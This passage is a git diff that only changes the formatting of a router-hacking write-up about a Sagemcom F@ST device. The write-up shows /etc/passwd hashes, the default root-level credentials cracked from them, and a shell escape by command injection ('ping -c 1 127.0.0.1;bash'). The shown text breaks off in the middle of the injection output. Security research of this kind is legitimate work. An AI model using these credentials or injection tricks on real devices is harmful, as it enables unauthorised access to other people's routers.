@@ -77,23 +77,28 @@ mcpctl
 
 
 No ls, no cd... I would need more than that. Still, I got cat!
-From there, I grab the ```/etc/passwd``` file. There were 2 users I found interesting.
+From there, I grab the `/etc/passwd` file. There were 2 users I found interesting.
 
-```support:5IkwiJv9RNzV.:0:0:Technical Support:/:/bin/sh
-user:75bUXAuHldJ82:0:0:Normal User:/:/bin/sh```
+```
+support:5IkwiJv9RNzV.:0:0:Technical Support:/:/bin/sh
+user:75bUXAuHldJ82:0:0:Normal User:/:/bin/sh
+```
 
 We can see their UID and GID is 0... who the hell gives admin privileges to a user account?????
 Cracking the hashes with the tool john, we find the credentials are
 
-```support:support
-user:user```
+```
+support:support
+user:user
+```
 
 The admin account had at least the decency of using a randomly generated password instead of a hardcoded one...
 
 Trying to log with the support account leads to a dead end, access is denied for some reason.
 This is not the case with the "user" account. Typing help in the user prompt gives us a really short list of commands that can be used by the user account.
 
-```> help
+```
+> help
 ?
 help
 logout
@@ -111,7 +116,8 @@ uptime
 cfgupdate
 swupdate
 exitOnIdle
-wan```
+wan
+```
 
 Let's explore the firmware for more info!
 
@@ -119,18 +125,21 @@ Unfortunately, the F@ST2704R firmware is not available to download, but the F@ST
 wget this stuff, and binwalk the shit out of it!
 Not so surprisingly, the binairies we want exist in the /bin folder, the shell we're provided just can't get to it. But we have access to ping...
 
- ```> ping -c 1 127.0.0.1
+ ```
+ > ping -c 1 127.0.0.1
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.866 ms
 
 --- 127.0.0.1 ping statistics ---
 1 packets transmitted, 1 packets received, 0% packet loss
-round-trip min/avg/max = 0.866/0.866/0.866 ms```
+round-trip min/avg/max = 0.866/0.866/0.866 ms
+```
 
 
 I wonder if... Let's try some semicolon magic!
 
-```> ls
+```
+> ls
 telnetd:error:997.792:processInput:406:unrecognized command ls
  >
  >
@@ -148,7 +157,8 @@ dev      linuxrc  proc     tmp      webs
 
 Alright! this way I can get a real shell
 
-``` > ping -c 1 127.0.0.1;bash
+```
+ > ping -c 1 127.0.0.1;bash
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.459 ms
 
